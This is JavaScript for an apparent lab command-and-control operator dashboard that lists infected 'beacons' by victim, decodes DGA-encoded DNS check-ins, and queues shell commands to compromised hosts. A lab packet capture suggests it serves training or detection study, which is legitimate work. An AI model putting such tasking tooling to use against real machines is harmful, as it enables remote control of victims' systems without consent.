let pendingModeEdit = false;
let lastServerMode = null;
let dgaSelection = 0;
const modeSelect = document.getElementById('mode');
modeSelect.addEventListener('change', () => { pendingModeEdit = true; });

function escapeHtml(value) {
  return String(value).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function escapeAttribute(value) {
  return escapeHtml(value).replace(/"/g, '&quot;');
}

function formatTime(value) {
  if (!value) return 'unknown';
  const parsed = new Date(value);
  return Number.isNaN(parsed.getTime()) ? String(value) : parsed.toLocaleTimeString();
}

function renderBeacons(beacons) {
  const body = document.getElementById('beacons');
  if (!beacons.length) {
    body.innerHTML = '<tr><td colspan="6">No beacons have checked in.</td></tr>';
  } else {
    body.innerHTML = beacons.map(beacon => {
      const details = [beacon.process, beacon.pid ? `pid ${beacon.pid}` : '', beacon.arch]
        .filter(Boolean)
        .map(escapeHtml)
        .join(' · ');
      return `
      <tr>
        <td><strong>${escapeHtml(beacon.hostname || 'unknown')}</strong><small>${details}</small></td>
        <td>${escapeHtml(beacon.username || '')}</td>
        <td>${escapeHtml(beacon.os || '')}</td>
        <td>${escapeHtml(beacon.ip || '')}</td>
        <td>${escapeHtml(beacon.version || '')}</td>
        <td>${escapeHtml(formatTime(beacon.last_seen))}</td>
      </tr>`;
    }).join('');
  }
  document.getElementById('beacon-count').textContent = beacons.length
    ? `${beacons.length} BEACON${beacons.length === 1 ? '' : 'S'}`
    : 'NO BEACONS';
  document.getElementById('beacon-summary').textContent = `${beacons.length} beacon${beacons.length === 1 ? '' : 's'}`;
  const select = document.getElementById('task-target');
  const selected = select.value;
  const options = ['<option value="all">All beacons</option>'].concat(beacons.map(beacon => (
    `<option value="${escapeAttribute(beacon.victim_id)}">${escapeHtml(beacon.hostname || beacon.victim_id)} (${escapeHtml(beacon.ip || '')})</option>`
  )));
  select.innerHTML = options.join('');
  if (selected === 'all' || beacons.some(beacon => beacon.victim_id === selected)) select.value = selected;
}

function renderPending(task) {
  document.getElementById('pending-task').textContent = task
    ? `${task.task_id}  target=${task.target}  $ ${task.command}`
    : 'No command in flight';
}

function renderQueries(queries) {
  const body = document.getElementById('dga-queries');
  const count = document.getElementById('dga-count');
  count.textContent = `${queries.length} ${queries.length === 1 ? 'QUERY' : 'QUERIES'}`;
  if (!queries.length) {
    body.innerHTML = '<tr><td colspan="6">No encoded check-ins yet.</td></tr>';
    renderBreakdown(null);
    return;
  }
  if (dgaSelection >= queries.length) dgaSelection = 0;
  body.innerHTML = queries.map((query, index) => {
    const rejected = query.decode_ok === false;
    const flagged = rejected && query.looks_encoded;
    const host = rejected ? (flagged ? 'checksum failed' : 'rejected') : escapeHtml(query.hostname || '');
    const mode = rejected ? '?' : `${query.mode} ${escapeHtml(query.mode_name || '')}`;
    const uid = rejected ? '-' : escapeHtml(query.uid || '');
    const coordinator = escapeHtml(String(query.coordinator_mode || '').toUpperCase());
    return `<tr data-index="${index}" class="${flagged ? 'flagged ' : ''}${index === dgaSelection ? 'selected' : ''}">
      <td>${escapeHtml(query.time || '')}</td>
      <td>${flagged ? '<span class="badge">BAD CRC</span> ' : ''}${host}</td>
      <td>${rejected ? '-' : escapeHtml(query.username || '')}</td>
      <td>${uid}</td>
      <td>${mode}</td>
      <td>${coordinator}</td>
    </tr>`;
  }).join('');
  renderBreakdown(queries[dgaSelection]);
}

function renderBreakdown(query) {
  document.getElementById('dga-breakdown').textContent = query
    ? (query.fields || []).map(([name, value]) => `${name}=${value}`).join('  ')
    : 'No query selected.';
}

function renderResults(results) {
  const items = results.slice().reverse();
  document.getElementById('results').textContent = items.length
    ? items.map(result => {
        const exit = result.exit_code === null || result.exit_code === undefined ? 'no exit code' : `exit ${result.exit_code}`;
        const error = result.error ? `\n${result.error}` : '';
        return `[${formatTime(result.received_at)}] ${result.hostname} (${result.victim_id})\n$ ${result.command}\n${exit}${error}\n${result.output}`;
      }).join('\n\n')
    : 'No command results yet.';
}

async function refresh() {
  try {
    const response = await fetch('/api/state');
    const state = await response.json();
    if (!response.ok) throw new Error(state.error || 'Attacker app cannot reach the lab engine');
    const modeLabel = state.mode === 'selected' ? 'ACTIVE' : state.mode.toUpperCase();
    if (lastServerMode !== null && lastServerMode !== state.mode) {
      pendingModeEdit = false;
      modeSelect.value = state.mode;
      document.getElementById('message').textContent = `Coordinator mode changed to ${modeLabel}.`;
    } else if (!pendingModeEdit) {
      modeSelect.value = state.mode;
    }
    lastServerMode = state.mode;
    renderBeacons(state.beacons || []);
    renderQueries(state.queries || []);
    renderPending(state.pending_task);
    renderResults(state.results || []);
    const infra = state.infrastructure || {};
    document.getElementById('infra-dns').textContent = infra.dns || '-';
    document.getElementById('infra-http').textContent = infra.http || '-';
    document.getElementById('infra-channel').textContent = infra.channel || '-';
    const capture = document.getElementById('capture-link');
    if (state.capture_ready) {
      capture.href = '/capture.pcap';
      capture.textContent = state.capture_file || 'c2-traffic.pcap';
      capture.classList.remove('disabled');
    } else {
      capture.href = '#';
      capture.textContent = state.capture_error ? 'capture unavailable' : 'capture starting';
      capture.classList.add('disabled');
    }
    document.getElementById('result').textContent = state.last_callback;
    document.getElementById('timeline').textContent = state.timeline.join('\n') || 'No beacon traffic yet.';
  } catch (error) { document.getElementById('message').textContent = error.message; }
}
document.getElementById('apply').addEventListener('click', async () => {
  const message = document.getElementById('message');
  try {
    const response = await fetch('/api/set-mode', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({mode:document.getElementById('mode').value})});
    const result = await response.json();
    if (!response.ok) throw new Error(result.error || 'Could not apply coordinator response');
    pendingModeEdit = false;
    message.textContent = result.message;
    await refresh();
  } catch (error) { message.textContent = error.message; }
});
document.getElementById('send-task').addEventListener('click', async () => {
  const message = document.getElementById('task-message');
  const input = document.getElementById('task-command');
  const command = input.value.trim();
  if (!command) {
    message.textContent = 'Type a command first.';
    return;
  }
  try {
    const response = await fetch('/api/queue-task', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({command, target:document.getElementById('task-target').value})
    });
    const result = await response.json();
    if (!response.ok) throw new Error(result.error || 'Could not queue the command');
    message.textContent = result.message;
    input.value = '';
    await refresh();
  } catch (error) { message.textContent = error.message; }
});
document.getElementById('task-command').addEventListener('keydown', event => {
  if (event.key === 'Enter') document.getElementById('send-task').click();
});
document.getElementById('dga-queries').addEventListener('click', event => {
  const row = event.target.closest('tr[data-index]');
  if (!row) return;
  dgaSelection = Number(row.dataset.index);
  refresh();
});
refresh();
setInterval(refresh, 1500);
